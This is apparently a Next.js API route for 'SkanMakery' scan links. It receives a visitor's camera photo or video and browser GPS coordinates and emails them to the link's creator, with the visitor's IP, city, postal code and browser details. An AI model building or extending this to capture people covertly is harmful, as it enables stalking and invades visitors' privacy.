import {NextResponse} from "next/server";
import {getDb} from "@/lib/mongodb";
import {sendMail} from "@/lib/mailer";
import {ObjectId} from "mongodb";

function esc(value:string){
 return String(value||"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]||c));
}
function firstHeader(req:Request,names:string[]){
 for(const name of names){const v=req.headers.get(name);if(v?.trim())return v.trim();}
 return "";
}
function visitor(req:Request){
 const forwarded=firstHeader(req,["x-forwarded-for","x-real-ip"]);
 return {
  ip:forwarded.split(",")[0].trim()||"Unknown",
  country:req.headers.get("x-vercel-ip-country")||"Unknown",
  region:req.headers.get("x-vercel-ip-country-region")||"Unknown",
  city:req.headers.get("x-vercel-ip-city")||"Unknown",
  timezone:req.headers.get("x-vercel-ip-timezone")||"Unknown",
  latitude:req.headers.get("x-vercel-ip-latitude")||"Unknown",
  longitude:req.headers.get("x-vercel-ip-longitude")||"Unknown",
  postal:req.headers.get("x-vercel-ip-postal-code")||"Unknown",
  ua:req.headers.get("user-agent")||"Unknown",
  ref:req.headers.get("referer")||"Direct / unknown"
 };
}
function flag(country:string){
 const c=String(country||"").toUpperCase();
 if(!/^[A-Z]{2}$/.test(c))return "🌍";
 return String.fromCodePoint(...[...c].map(x=>127397+x.charCodeAt(0)));
}
function approxLocation(v:ReturnType<typeof visitor>){
 return [v.city,v.region,v.country].filter(x=>x&&x!=="Unknown").join(", ")||"Location unavailable";
}

export async function GET(_req:Request,{params}:{params:Promise<{slug:string}>}){
 const {slug}=await params;
 const db=await getDb();
 const c=await db.collection("scan_campaigns").findOne({slug,active:true});
 if(!c)return NextResponse.json({error:"Not found"},{status:404});
 return NextResponse.json({title:c.title,message:c.message,mode:c.mode,camera:c.camera,seconds:c.seconds});
}

export async function POST(req:Request,{params}:{params:Promise<{slug:string}>}){
 try{
  const {slug}=await params;
  const db=await getDb();
  const c=await db.collection("scan_campaigns").findOne({slug,active:true});
  if(!c)return NextResponse.json({error:"Not found"},{status:404});

  let to=String(c.creatorEmail||"").trim().toLowerCase();
  if(!to&&c.userId&&ObjectId.isValid(String(c.userId))){
   const u=await db.collection("users").findOne({_id:new ObjectId(String(c.userId))});
   to=String(u?.email||"").trim().toLowerCase();
  }
  if(!to)to=String(process.env.ADMIN_GMAIL||process.env.ADMIN_EMAIL||"").trim().toLowerCase();
  if(!to)return NextResponse.json({error:"Creator email not found"},{status:500});

  const action=req.headers.get("x-skan-action")||"capture";
  if(action==="location"){
   const body=await req.json().catch(()=>({}));const lat=Number(body.latitude),lon=Number(body.longitude),accuracy=Number(body.accuracy||0);
   if(!Number.isFinite(lat)||!Number.isFinite(lon))return NextResponse.json({error:"Location coordinates are required."},{status:400});
   const v=visitor(req),now=new Date();
   const html=`<!doctype html><html><body style="margin:0;background:#f3f6fb;font-family:Arial;color:#172033"><div style="max-width:650px;margin:auto;padding:25px"><div style="background:#111827;color:#fff;padding:25px;border-radius:22px 22px 0 0"><b style="color:#a5b4fc">SKANMAKERY • LOCATION ALERT</b><h1 style="margin:10px 0">New location scan 📍</h1><p style="color:#d1d5db">A visitor allowed browser location access.</p></div><div style="background:#fff;padding:25px;border-radius:0 0 22px 22px"><h2>${esc(c.name)}</h2><p><b>Latitude:</b> ${lat}<br><b>Longitude:</b> ${lon}<br><b>Accuracy:</b> ${Number.isFinite(accuracy)?accuracy+" meters":"Unknown"}</p><p><b>IP:</b> ${esc(v.ip)}<br><b>Approx. network location:</b> ${esc(approxLocation(v))}</p><a href="https://www.google.com/maps?q=${lat},${lon}" style="display:inline-block;padding:12px 16px;background:#635bff;color:#fff;text-decoration:none;border-radius:10px">Open in Maps →</a><p style="font-size:12px;color:#64748b;margin-top:22px">Browser coordinates are provided only after the visitor explicitly grants location permission.</p></div></div></body></html>`;
   await sendMail(to,"📍 SkanMakery — New Location · "+c.name,html);
   await db.collection("scan_campaigns").updateOne({_id:c._id},{$inc:{locations:1},$set:{lastLocationAt:now,lastCaptureIp:v.ip,lastCaptureCountry:v.country}});
   return NextResponse.json({ok:true});
  }

  const form=await req.formData();
  const file=form.get("file");
  if(!(file instanceof File))return NextResponse.json({error:"Capture file missing"},{status:400});
  if(file.size>80*1024*1024)return NextResponse.json({error:"Capture is too large to email. Maximum size is 80 MB."},{status:413});

  const buf=Buffer.from(await file.arrayBuffer());
  const type=file.type||"application/octet-stream";
  const v=visitor(req);
  const now=new Date();
  const mode=c.mode==="video"?"video":"photo";
  const subject="📸 SkanMakery — New "+(mode==="video"?"Video":"Photo")+" Capture · "+c.name;
  const loc=esc(approxLocation(v));
  const when=esc(now.toLocaleString("en-US",{dateStyle:"medium",timeStyle:"medium",timeZone:"UTC"})+" UTC");

  const html=`<!doctype html><html><body style="margin:0;background:#f3f6fb;font-family:Arial,Helvetica,sans-serif;color:#172033">
<div style="max-width:680px;margin:0 auto;padding:28px 16px">
 <div style="background:#111827;border-radius:24px 24px 0 0;padding:28px;color:#fff">
  <div style="font-size:13px;font-weight:800;letter-spacing:1.5px;color:#a5b4fc">SKANMAKERY • SCAN ALERT</div>
  <h1 style="font-size:26px;margin:10px 0 6px">New ${mode==="video"?"video":"photo"} capture received 🎉</h1>
  <p style="margin:0;color:#d1d5db">A visitor completed your Video Recorder Scan.</p>
 </div>
 <div style="background:#fff;padding:26px;border-radius:0 0 24px 24px">
  <div style="background:#f8fafc;border:1px solid #e5e7eb;border-radius:18px;padding:18px">
   <div style="font-size:12px;color:#64748b;font-weight:800">CAPTURE</div>
   <div style="font-size:19px;font-weight:800;margin-top:6px">${esc(c.name)}</div>
   <div style="font-size:14px;color:#64748b;margin-top:5px">Created for ${esc(c.creatorName||"SkanMakery creator")}</div>
  </div>
  <h2 style="font-size:17px;margin:22px 0 10px">🌍 Visitor information</h2>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
   <tr><td style="padding:8px 0;color:#64748b;width:38%">Approx. location</td><td style="padding:8px 0;font-weight:700">${flag(v.country)} ${loc}</td></tr>
   <tr><td style="padding:8px 0;color:#64748b">IP address</td><td style="padding:8px 0;font-weight:700">${esc(v.ip)}</td></tr>
   <tr><td style="padding:8px 0;color:#64748b">Country</td><td style="padding:8px 0">${esc(v.country)}</td></tr>
   <tr><td style="padding:8px 0;color:#64748b">Region</td><td style="padding:8px 0">${esc(v.region)}</td></tr>
   <tr><td style="padding:8px 0;color:#64748b">City</td><td style="padding:8px 0">${esc(v.city)}</td></tr>
   <tr><td style="padding:8px 0;color:#64748b">Postal code</td><td style="padding:8px 0">${esc(v.postal)}</td></tr>
   <tr><td style="padding:8px 0;color:#64748b">Timezone</td><td style="padding:8px 0">${esc(v.timezone)}</td></tr>
   <tr><td style="padding:8px 0;color:#64748b">IP coordinates</td><td style="padding:8px 0">${esc(v.latitude)}, ${esc(v.longitude)}</td></tr>
  </table>
  <div style="background:#fff7ed;border:1px solid #fed7aa;border-radius:14px;padding:12px 14px;margin-top:12px;font-size:12px;color:#9a3412">
   <b>Location note:</b> this is approximate IP-based geolocation, not precise GPS. Accuracy can vary with VPNs and mobile networks.
  </div>
  <h2 style="font-size:17px;margin:22px 0 10px">🕒 Capture details</h2>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
   <tr><td style="padding:8px 0;color:#64748b;width:38%">Time</td><td style="padding:8px 0">${when}</td></tr>
   <tr><td style="padding:8px 0;color:#64748b">Type</td><td style="padding:8px 0">${mode}</td></tr>
   <tr><td style="padding:8px 0;color:#64748b">File</td><td style="padding:8px 0">${esc(file.name||"capture")}</td></tr>
   <tr><td style="padding:8px 0;color:#64748b">Size</td><td style="padding:8px 0">${(file.size/1024/1024).toFixed(2)} MB</td></tr>
  </table>
  <h2 style="font-size:17px;margin:22px 0 10px">📱 Browser</h2>
  <div style="font-size:12px;line-height:1.6;color:#475569;background:#f8fafc;border-radius:12px;padding:12px;word-break:break-word">${esc(v.ua)}</div>
  <div style="font-size:12px;color:#64748b;margin-top:8px">Referrer: ${esc(v.ref)}</div>
  <div style="margin-top:24px;padding-top:18px;border-top:1px solid #e5e7eb;color:#64748b;font-size:12px">
   The captured media is attached to this email. The location shown above comes from IP-based geolocation and is approximate.
  </div>
 </div>
</div></body></html>`;

  await sendMail(to,subject,html,[{
   filename:file.name||(mode==="video"?"capture.webm":"capture.jpg"),
   content:buf,
   contentType:type
  }]);

  await db.collection("scan_campaigns").updateOne(
   {_id:c._id},
   {$inc:{captures:1},$set:{lastCaptureAt:now,lastCaptureIp:v.ip,lastCaptureCountry:v.country}}
  );
  return NextResponse.json({ok:true});
 }catch(e){
  console.error(e);
  return NextResponse.json({error:"Could not deliver capture"},{status:500});
 }
}
